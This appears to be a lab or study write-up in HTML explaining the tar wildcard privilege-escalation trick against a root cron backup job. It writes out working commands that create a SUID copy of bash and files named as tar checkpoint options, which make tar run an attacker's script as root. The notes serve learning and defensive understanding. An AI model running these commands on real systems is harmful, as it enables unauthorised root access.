<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Cron (Wildcard)</title>
</head><body>This is a lessona about wildcards, something that you can utilize even outside Cron!<br/>
<br/>
If we look at crontab, we can see a backup script with an <b>absolute path:<br/>
</b><img src="crontab compress script.png" /><b><br/>
</b><b><br/>
<br/>
Better have a look of the compress script:<br/>
There is a wildcare in there!<br/>
</b>The asterisk <b>* is a wildcare </b>and generally means "Every file"<br/>
<img src="compress script.png" /><br/>
<br/>
<br/>
<b>Because of the wildcard, we can create a script and let it run by tar!<br/>
</b>We<b>&nbsp;</b>can get started by creating a malicious script and making it executable:<b><br/>
</b><br/>
<b>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; /home/user/runme.sh</b>&nbsp; <br/>
<img src="runme script.png" /><br/>
<br/>
<br/>
<span style="font-size: 10pt"><span style="font-family: Ubuntu Mono"><div style="text-align: left"><b>touch /home/user/--checkpoint=1<br/>
</b></div></span></span><span style="font-size: 10pt"><span style="font-family: Ubuntu Mono"><div style="text-align: left"><b>touch /home/user/--checkpoint-action=exec=sh\ runme.sh</b></div></span>&nbsp; </span><br/>
<img src="touch checkpoints.png" /><br/>
<br/>
<br/>
From now, wait a minute and the script should be executed.<br/>
<b><img src="cron path exploit.png" /><br/>
<br/>
<span style="font-size: 15pt">How the exploit works:<br/>
Thanks to the wildcard...<br/>
</span></b><span style="font-size: 15pt"><b>You are creating 2 file called like <i>the tar options</i></b><br/>
When the script from cron will read the paths, will read the <b>--checkpoint=1<br/>
</b><b>and when you hit a checkpoint, do action --checkpoint-action=exec=sh\<br/>
<br/>
The tar command, in the end, will read like the last line in this image<br/>
</b></span><img src="tar wildcard exploit.png" /><br/>
</body></html>